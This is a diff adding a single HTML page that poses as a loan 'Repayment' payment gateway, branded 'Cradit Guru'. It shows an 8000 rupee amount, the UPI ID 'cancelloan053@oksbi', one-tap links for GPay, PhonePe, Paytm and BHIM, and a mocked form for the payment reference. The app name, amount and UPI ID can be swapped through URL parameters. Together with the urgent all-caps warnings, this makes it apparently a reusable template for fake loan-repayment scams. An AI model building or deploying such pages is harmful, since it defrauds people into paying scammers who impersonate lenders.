@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Payment Gateway — Repayment</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+<style>
+.card{background:#fff;border-radius:14px;box-shadow:0 8px 24px rgba(17,24,39,0.06)}
+.primary{background:#5b3ca3}
+.primary:hover{background:#432a78}
+.iconbtn{border:1px solid #ececec;border-radius:12px}
+.small{font-size:12px}
+.logoimg{width:48px;height:48px;object-fit:contain}
+</style>
+</head>
+<body class="bg-gray-100 font-sans">
+<div class="max-w-md mx-auto p-4">
+
+  <!-- Header -->
+  <div class="flex items-center justify-between mb-4">
+    <a href="javascript:history.back()" class="text-gray-600 text-lg">&larr;</a>
+    <div class="font-bold text-lg text-gray-900 text-center flex-1" style="margin-left:-20px;">
+      <span id="displayAppName">APP NAME</span> - Cradit Guru
+    </div>
+  </div>
+
+  <!-- Amount Display -->
+  <div class="card p-4 mb-4 text-center">
+    <div class="text-sm text-gray-500">Repayment Amount</div>
+    <div class="text-4xl font-bold mt-2" style="color:#5b3ca3" id="displayAmount">8000</div>
+  </div>
+
+  <!-- UPI Section -->
+  <div class="card p-4 mb-4">
+    <div class="flex items-center justify-between mb-3">
+      <div class="font-medium break-words" id="upiText">cancelloan053@oksbi</div>
+      <button onclick="copyUPI()" class="iconbtn px-3 py-2 font-semibold" style="color:#5b3ca3">Copy UPI</button>
+    </div>
+
+    <div class="text-center text-sm text-gray-500">Pay using any UPI app</div>
+    <div class="grid grid-cols-4 gap-3 mt-3">
+      <a id="linkGpay" class="flex flex-col items-center p-2 iconbtn rounded upi-link" rel="nofollow">
+        <img class="logoimg" src="https://commons.wikimedia.org/wiki/Special:FilePath/GPay%20%28or%20Google%20Pay%2C%20Pay%20with%20Google%29%20Brand%20Mark%20%282018-2020%29.png" alt="GPay" onerror="this.onerror=null;this.src='https://placehold.co/96x96/png?text=GPay'" />
+        <div class="text-xs mt-2">GPay</div>
+      </a>
+
+      <a id="linkPhonepe" class="flex flex-col items-center p-2 iconbtn rounded upi-link" rel="nofollow">
+        <img class="logoimg" src="https://commons.wikimedia.org/wiki/Special:FilePath/Phonepe.svg?width=256" alt="PhonePe" onerror="this.onerror=null;this.src='https://placehold.co/96x96/png?text=PhonePe'" />
+        <div class="text-xs mt-2">PhonePe</div>
+      </a>
+
+      <a id="linkPaytm" class="flex flex-col items-center p-2 iconbtn rounded upi-link" rel="nofollow">
+        <img class="logoimg" src="https://commons.wikimedia.org/wiki/Special:FilePath/Paytm%20logo.png" alt="Paytm" onerror="this.onerror=null;this.src='https://placehold.co/96x96/png?text=Paytm'" />
+        <div class="text-xs mt-2">Paytm</div>
+      </a>
+
+      <a id="linkBhim" class="flex flex-col items-center p-2 iconbtn rounded upi-link" rel="nofollow">
+        <img class="logoimg" src="https://commons.wikimedia.org/wiki/Special:FilePath/Bhim-logo.png" alt="BHIM" onerror="this.onerror=null;this.src='https://placehold.co/96x96/png?text=BHIM'" />
+        <div class="text-xs mt-2">BHIM</div>
+      </a>
+    </div>
+  </div>
+
+  <!-- UTR Submission (Mocked) -->
+  <div class="card p-4 mb-4">
+    <form id="utrForm" class="flex gap-2">
+      <input id="utrInput" placeholder="UTR (UPI Ref.ID) must be" class="flex-1 border p-3 rounded" required />
+      <button type="submit" class="primary text-white px-4 rounded">Submit UTR</button>
+    </form>
+  </div>
+
+  <div class="mb-6 text-sm">
+    <div class="font-bold mb-2">Tips:</div>
+    <div class="text-red-600 font-bold">!!! One UPI can only transfer money ONCE.</div>
+    <div class="text-red-600 font-bold">!!! DO NOT CHANGE the payment AMOUNT & UPI.</div>
+    <div class="text-red-600 font-bold">!!! DO NOT transfer money in the UPI friend CHAT window again.</div>
+    <div class="mt-2">Otherwise, the order <span class="text-red-600 font-bold">CANNOT</span> be completed.</div>
+    <div>After payment is completed, please <span class="text-red-600 font-bold">fill in the UTR</span>.</div>
+  </div>
+
+  <div class="mb-10">
+    <button onclick="submitVerify()" class="w-full primary text-white font-bold py-3 rounded-2xl">Submit to Verify</button>
+  </div>
+
+</div>
+
+<script>
+// Static Configuration via URL Parameters
+const urlParams = new URLSearchParams(window.location.search);
+
+// Set defaults here. You can change these before uploading to GitHub.
+const config = {
+    app_name: urlParams.get('app') || 'APP NAME',
+    amount: urlParams.get('amount') || '8000',
+    upi_id: urlParams.get('upi') || 'cancelloan053@oksbi'
+};
+
+// Update UI elements
+document.getElementById('displayAppName').textContent = config.app_name;
+document.getElementById('displayAmount').textContent = config.amount;
+document.getElementById('upiText').textContent = config.upi_id;
+document.title = config.app_name + ' — Repayment';
+
+// Generate UPI Links dynamically
+const upi_pa = encodeURIComponent(config.upi_id);
+const upi_pn = encodeURIComponent(config.app_name);
+const upi_am = encodeURIComponent(config.amount);
+const upi_cu = 'INR';
+const upi_tn = encodeURIComponent('Repayment');
+const upi_tr = encodeURIComponent('REF' + Date.now().toString().slice(-8));
+
+const upi_uri = `upi://pay?pa=${upi_pa}&pn=${upi_pn}&am=${upi_am}&cu=${upi_cu}&tn=${upi_tn}&tr=${upi_tr}`;
+
+// Android Intents
+const intent_gpay = `intent://pay?pa=${upi_pa}&pn=${upi_pn}&am=${upi_am}&cu=${upi_cu}&tn=${upi_tn}&tr=${upi_tr}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+const intent_phonepe = `intent://pay?pa=${upi_pa}&pn=${upi_pn}&am=${upi_am}&cu=${upi_cu}&tn=${upi_tn}&tr=${upi_tr}#Intent;scheme=upi;package=com.phonepe.app;end`;
+const intent_paytm = `intent://pay?pa=${upi_pa}&pn=${upi_pn}&am=${upi_am}&cu=${upi_cu}&tn=${upi_tn}&tr=${upi_tr}#Intent;scheme=upi;package=net.one97.paytm;end`;
+const intent_bhim = `intent://pay?pa=${upi_pa}&pn=${upi_pn}&am=${upi_am}&cu=${upi_cu}&tn=${upi_tn}&tr=${upi_tr}#Intent;scheme=upi;package=in.org.npci.upiapp;end`;
+
+// Assign links
+document.getElementById('linkGpay').href = intent_gpay;
+document.getElementById('linkPhonepe').href = intent_phonepe;
+document.getElementById('linkPaytm').href = intent_paytm;
+document.getElementById('linkBhim').href = intent_bhim;
+
+// Fallback for non-Android devices
+const isAndroid = /Android/i.test(navigator.userAgent);
+if (!isAndroid) {
+    document.querySelectorAll('a.upi-link').forEach(a => {
+        a.href = upi_uri;
+    });
+}
+
+// Copy to clipboard
+function copyUPI(){
+    const t = document.getElementById('upiText').innerText.trim();
+    navigator.clipboard.writeText(t).then(()=>alert('UPI copied')).catch(()=>alert(t));
+}
+
+// Mock Form Submission (No Database)
+document.getElementById('utrForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const utr = document.getElementById('utrInput').value;
+    alert('Mock Submission: UTR ' + utr + ' submitted successfully!\\n\\n(Note: Because this is hosted on GitHub Pages, no actual data is saved to a server.)');
+    document.getElementById('utrInput').value = '';
+});
+
+function submitVerify(){
+    const u = prompt('Enter UTR / UPI Ref. ID');
+    if(!u) return;
+    alert('Mock Submission: UTR ' + u + ' submitted successfully!\\n\\n(Note: Because this is hosted on GitHub Pages, no actual data is saved to a server.)');
+}
+</script>
+</body>
+</html>
